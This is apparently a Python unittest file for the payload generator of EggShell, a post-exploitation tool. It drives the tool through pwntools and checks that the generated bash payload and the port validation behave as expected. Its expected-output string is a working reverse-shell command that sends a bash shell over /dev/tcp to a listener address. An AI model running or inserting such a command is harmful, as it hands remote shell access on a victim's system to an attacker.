import unittest
from modules.payloads import bash_payload, teensy_payload
import pwn

class TestBashPayload(unittest.TestCase):
    @classmethod
    def setUpClass(self):
        print "============ Testing Bash Payload ============"

    def setUp(self):
        # setup payload for further tests
        self.payload = bash_payload.payload()

        # disable pwntools log
        pwn.context.log_level = 'critical'
        
        # start proc
        self.eggshell_proc = pwn.process(["python", "eggshell.py"])

        # make payload
        self.eggshell_proc.sendline("3")
        self.eggshell_proc.sendline("1")

    def tearDown(self):
        self.eggshell_proc.kill()

    def test_bash_instance(self):
        print "== Instantiated bash payload =="
        self.assertTrue(isinstance(self.payload, bash_payload.payload))
        print "== Is a bash payload, confirmed =="

    def test_bash_properties(self):
        print "== Testing bash properties =="
        self.assertTrue(self.payload.name == "bash")
        print "== bash properties good =="
    
    def test_bash_generation(self):
        # set lhost
        self.eggshell_proc.sendline("199.199.199.253")

        # set lport
        self.eggshell_proc.sendline("9999")

        # get output
        self.eggshell_proc.recvuntil("LPORT = ")
        self.eggshell_proc.recvuntil("----------------------------------------")
        self.eggshell_proc.recvline()
        payload = self.eggshell_proc.recvline()[7:-5]
        
        # expected output (this is our baseline)
        expected_out = "bash &> /dev/tcp/199.199.199.253/9999 0>&1"

        print "== Testing bash payload args =="
        self.assertTrue(expected_out == payload)
        print "== Bash payload args good =="

    def test_bash_bad_port(self):
        # default lhost
        self.eggshell_proc.sendline("")

        # invalid port (has to be >=1024)
        self.eggshell_proc.sendline("42")

        out = self.eggshell_proc.recvall(timeout=0.5)
        expected = "invalid port, please enter a value >= 1024"

        print "== Testing reprompt for payload port =="
        self.assertTrue(expected in out)
        print "== Reprompt for port good =="